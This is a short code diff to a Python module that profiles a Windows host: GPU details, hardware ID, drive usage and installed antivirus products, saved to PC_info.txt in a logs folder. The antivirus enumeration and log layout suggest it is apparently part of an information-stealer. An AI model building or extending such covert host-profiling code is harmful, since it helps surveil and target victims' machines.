@@ -88,11 +88,11 @@ drive space used: {get_size(mount.used)}
         hwid = "Can't get"  
     
     gpu_info = ""
+    list_gpus = []
 
 
     try:
         gpus = getGPUs()
-        list_gpus = []
         for gpu in gpus:
             gpu_name = gpu.name
             gpu_free_memory = f"{gpu.memoryFree}MB"
@@ -239,7 +239,7 @@ Antiviruses: {', '.join(Antiviruses)}
 
     try:
         user = environ['USERPROFILE']
-        pathToLogs = f'{user}\\{config.pathToLogs}\\System'
+        pathToLogs = f'{config.pathToLogs}\\System'
         makedirs(pathToLogs, exist_ok=True)
         file = open(f'{pathToLogs}\\PC_info.txt', "w+", encoding='utf-8')
         file.write(systeminfo)
